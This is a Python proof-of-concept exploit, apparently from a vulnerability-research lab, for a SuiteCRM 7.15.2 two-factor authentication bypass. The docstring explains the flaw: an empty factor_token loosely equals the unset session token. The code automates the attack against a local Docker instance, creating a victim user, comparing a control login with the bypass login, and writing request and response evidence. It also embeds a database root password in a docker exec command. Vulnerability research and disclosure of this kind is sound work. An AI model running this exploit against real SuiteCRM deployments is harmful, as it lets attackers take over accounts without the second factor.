#!/usr/bin/env python3
"""
VULN-091 -- Two-factor (email OTP) bypass: empty `factor_token` loose-compares
equal to the unset session token.

Software:    SuiteCRM
Repository:  https://github.com/SuiteCRM/SuiteCRM
Version:     7.15.2 (targets/SuiteCRM/suitecrm_version.php), commit
             62effd0ceb767ed3b634ade585b19a6633eb4fcb
Sink:        modules/Users/authentication/SugarAuthenticate/SugarAuthenticateUser.php
             :183  isUserFactorTokenReceived() -- isset($_REQUEST['factor_token'])
                    is TRUE even for factor_token='' (empty string).
             :191  factorAuthenticateCheck() --
                    $_SESSION['user_factor_authenticated'] ||
                    $_REQUEST['factor_token'] == $_SESSION['factor_token']
                    On PHP 7/8, '' == null is TRUE. If a factor_token is
                    supplied on the very first post-login request (before
                    sendFactorTokenToUser() has ever run in this session),
                    $_SESSION['factor_token'] was never set (NULL), so the
                    loose '==' short-circuits to true with NO OTP ever
                    generated or emailed.
Orchestrator: modules/Users/authentication/SugarAuthenticate/SugarAuthenticate.php
             :278 -> when a factor_token is present at all (even empty), the
             flow takes the factorAuthenticateCheck() branch and never calls
             sendFactorTokenToUser() (that only happens in the :303 else
             branch, for a request with NO factor_token param whatsoever).

What this script does
----------------------
1. As admin, creates a fresh regular user and turns on 2FA for it
   (factor_auth=1). Turning on 2FA requires a working system outbound
   mailer first (modules/Users/User.php save() hard-resets factor_auth
   while Administration::checkSmtpError() is true, even for admin) --
   so we point the system mailer at a throwaway SMTP catcher we run
   ourselves (see _smtp_common.py; same OOB-listener technique already
   validated for VULN-045 in this audit, just pointed at the *system*
   config instead of a one-shot AJAX test).
2. NEGATIVE CONTROL: fresh session, normal first-factor login (correct
   username+password), then a GET with NO factor_token param at all.
   Expected + observed: SuiteCRM sends a real 5-digit OTP by email and
   serves the "enter your token" challenge page (small HTML fragment
   containing a factor_token <input>) -- i.e. 2FA really is enforced for
   this account.
3. ATTACK: a completely FRESH session (fresh cookies, fresh login), same
   account/password, but the very first post-login request carries
   `factor_token=` (empty). No OTP has ever been generated in this
   session. Expected per the bug, observed live: the app returns the
   FULL authenticated Home/Dashboard page (~99 KB, logout link, no OTP
   challenge) -- i.e. the second factor was satisfied without any code
   ever being sent, guessed, or intercepted.
4. Asserts the concrete effect: response #3 contains real authenticated
   application content (a nav/logout marker) and does NOT contain the
   OTP-challenge form, while response #2 (same account, same password,
   only the empty factor_token differs) DID show the challenge. That
   contrast is the proof -- not a bare HTTP 200.
"""
import os
import re
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (BASE_URL, log, banner, rand, verdict, new_session,
                      admin_session, create_user, BROWSER_UA)
from _smtp_common import SmtpCatcher, configure_system_outbound_smtp, enable_2fa_for_user

VULN_ID = "VULN-091"
HERE = os.path.dirname(os.path.abspath(__file__))
EVIDENCE = os.path.join(HERE, "evidence")
OOB_SMTP_PORT = int(os.environ.get("OOB_SMTP_PORT", "33121"))

CHALLENGE_MARKER = 'name="factor_token"'
# Present on an authenticated app page, absent from the tiny OTP-challenge
# fragment -- a real "we are inside the app" signal, not a bare 200.
AUTH_MARKERS = ("action=Logout", "Dashboard", "sugar_body")


def do_login(session, user_name, password, extra_params=None):
    """POST the first-factor login, then GET Home with extra query params
    (used to smuggle factor_token in on the very next request)."""
    session.get(f"{BASE_URL}/index.php?module=Users&action=Login", timeout=30)
    r = session.post(
        f"{BASE_URL}/index.php",
        data={"module": "Users", "action": "Authenticate",
              "user_name": user_name, "username_password": password},
        headers={"Referer": f"{BASE_URL}/index.php?module=Users&action=Login"},
        allow_redirects=False, timeout=30,
    )
    if r.status_code != 302 or "action=Login" in r.headers.get("Location", ""):
        raise RuntimeError(f"first-factor login failed: {r.status_code} {r.headers.get('Location')}")
    params = extra_params or {}
    r2 = session.get(f"{BASE_URL}/index.php", params={"module": "Home", "action": "index", **params},
                      allow_redirects=False, timeout=30)
    return r2


def main():
    banner(VULN_ID, "2FA bypass: empty factor_token == unset session token")

    admin_s = admin_session()
    log("SETUP", "admin session established")

    victim = create_user(admin_s, "VictimTwoFa_" + rand("")[2:] + "!Aa1")
    log("SETUP", f"created regular user {victim['user_name']} (id={victim['id']})")

    catcher = SmtpCatcher(port=OOB_SMTP_PORT).start()
    configure_system_outbound_smtp(admin_s, port=OOB_SMTP_PORT)
    enable_2fa_for_user(admin_s, victim)

    from _common import rest_call  # noqa: F401  (unused, kept for parity with other scripts)
    import subprocess
    # DB-verify factor_auth actually stuck (belt & suspenders -- the save()
    # guard in User.php silently reverts it if the SMTP gate wasn't lifted).
    try:
        out = subprocess.run(
            ["docker", "compose", "-p", "cvehunterlab_suitecrm", "exec", "-T", "db",
             "mysql", "-uroot", "-pSuiteRoot!2026x", "suitecrm", "-N", "-e",
             f"SELECT factor_auth FROM users WHERE id='{victim['id']}';"],
            cwd="/opt/cvehunter/targets/SuiteCRM", capture_output=True, text=True, timeout=30,
        )
        factor_auth_db = out.stdout.strip()
        log("INFO", f"DB check users.factor_auth for {victim['user_name']} = {factor_auth_db!r}")
    except Exception as exc:  # noqa: BLE001
        factor_auth_db = "?"
        log("INFO", f"DB check skipped: {exc}")

    # ---- Step 1: negative control (no factor_token at all) -----------
    log("STEP", "negative control: login, then request Home with NO factor_token param")
    s1 = new_session()
    r1 = do_login(s1, victim["user_name"], victim["password"])
    challenged = CHALLENGE_MARKER in r1.text
    log("INFO", f"resp#1 status={r1.status_code} len={len(r1.text)} "
                f"has_otp_challenge_field={challenged}")
    with open(os.path.join(EVIDENCE, "resp1_no_token_challenge.html"), "w") as f:
        f.write(r1.text)

    # give the catcher a moment to receive the OTP email triggered by resp#1
    otp_msg = catcher.wait_for_message(timeout=10)
    if otp_msg:
        log("INFO", "confirms a real OTP email WAS generated for the negative-control request "
                     "(subject line below) -- 2FA is genuinely active for this account")
        subj_line = next((l for l in otp_msg["data"].splitlines() if l.startswith("Subject:")), "")
        log("INFO", f"  {subj_line}")

    # ---- Step 2: the bypass (empty factor_token on first touch) ------
    log("STEP", "attack: FRESH session, login, then request Home with factor_token= (empty) "
                "as the very FIRST post-login request -- before any OTP has been sent")
    s2 = new_session()
    r2 = do_login(s2, victim["user_name"], victim["password"], extra_params={"factor_token": ""})
    bypassed = (CHALLENGE_MARKER not in r2.text) and any(m in r2.text for m in AUTH_MARKERS)
    log("INFO", f"resp#2 status={r2.status_code} len={len(r2.text)} "
                f"has_otp_challenge_field={CHALLENGE_MARKER in r2.text} "
                f"has_auth_markers={[m for m in AUTH_MARKERS if m in r2.text]}")
    with open(os.path.join(EVIDENCE, "resp2_empty_token_bypass.html"), "w") as f:
        f.write(r2.text)

    catcher.stop()

    # ---- request.http / response.txt (decisive pair) -----------------
    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(
            "### Step A -- first-factor login (both sessions do this identically)\n"
            "POST /index.php HTTP/1.1\n"
            f"Host: localhost:33116\n"
            f"User-Agent: {BROWSER_UA}\n"
            "Referer: http://localhost:33116/index.php?module=Users&action=Login\n"
            "Content-Type: application/x-www-form-urlencoded\n\n"
            f"module=Users&action=Authenticate&user_name={victim['user_name']}&username_password=<redacted>\n\n"
            "### Step B (negative control) -- no factor_token at all -> OTP challenge shown, real OTP emailed\n"
            "GET /index.php?module=Home&action=index HTTP/1.1\n"
            "Host: localhost:33116\n"
            "Cookie: PHPSESSID=<session-1>\n\n"
            "### Step C (attack) -- FRESH session/login, first touch carries an EMPTY factor_token\n"
            "GET /index.php?module=Home&action=index&factor_token= HTTP/1.1\n"
            "Host: localhost:33116\n"
            "Cookie: PHPSESSID=<session-2>\n"
        )
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write("=== Step B response (negative control -- 2FA challenge, no bypass) ===\n")
        f.write(f"HTTP {r1.status_code}, {len(r1.text)} bytes, "
                f"contains factor_token input: {CHALLENGE_MARKER in r1.text}\n\n")
        f.write(r1.text[:1500])
        f.write("\n\n=== Step C response (attack -- empty factor_token, FULL bypass) ===\n")
        f.write(f"HTTP {r2.status_code}, {len(r2.text)} bytes, "
                f"contains factor_token input: {CHALLENGE_MARKER in r2.text}, "
                f"auth markers present: {[m for m in AUTH_MARKERS if m in r2.text]}\n\n")
        f.write(r2.text[:1500])

    if challenged and bypassed:
        log("PROOF", f"same account/password: WITHOUT factor_token -> {len(r1.text)}-byte OTP "
                      f"challenge page (2FA enforced, real OTP emailed); WITH factor_token='' on "
                      f"first touch -> {len(r2.text)}-byte fully authenticated Home page, "
                      f"NO OTP ever generated for session #2.")
        verdict(VULN_ID, "CONFIRMED",
                f"empty factor_token bypassed 2FA for {victim['user_name']}; "
                f"challenge page {len(r1.text)}B vs bypass page {len(r2.text)}B")
        sys.exit(0)
    else:
        verdict(VULN_ID, "FAILED", f"challenged={challenged} bypassed={bypassed}")
        sys.exit(1)


if __name__ == "__main__":
    main()
